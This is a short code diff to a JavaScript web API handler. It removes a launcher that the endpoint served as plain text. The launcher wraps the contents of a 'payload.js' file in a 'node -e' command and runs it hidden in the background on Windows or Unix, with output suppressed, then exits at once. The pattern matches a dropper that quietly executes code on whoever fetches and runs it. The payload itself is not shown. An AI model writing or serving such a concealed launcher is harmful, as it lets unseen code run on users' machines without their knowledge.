@@ -26,30 +26,5 @@ export default function handler(req, res) {
 
   // Client-side payload code (same for all OS)
   const scriptPath = path.resolve("./payload.js");
-  const payload = fs.readFileSync(scriptPath, "utf-8");
-
-  // Prepare payload for -e "code"
-  const escaped = JSON.stringify(payload); // safe string literal
-
-  const launcher = `
-const { exec } = require("child_process");
-const os = require("os");
-
-const isWin = os.platform() === "win32";
-const nodeCmd = \`node -e \${${escaped}} \`;
-
-// Background command per OS
-const cmd = isWin
-  ? 'start "" /b ' + nodeCmd
-  : 'nohup ' + nodeCmd + ' >/dev/null 2>&1 &';
-
-// Run background
-exec(cmd, { windowsHide: true });
-
-// Exit immediately
-process.exit(0);
-`;
-
-  res.setHeader("Content-Type", "text/plain; charset=utf-8");
-  res.send(launcher);
+  const script = fs.readFileSync(scriptPath, "utf-8");
 }
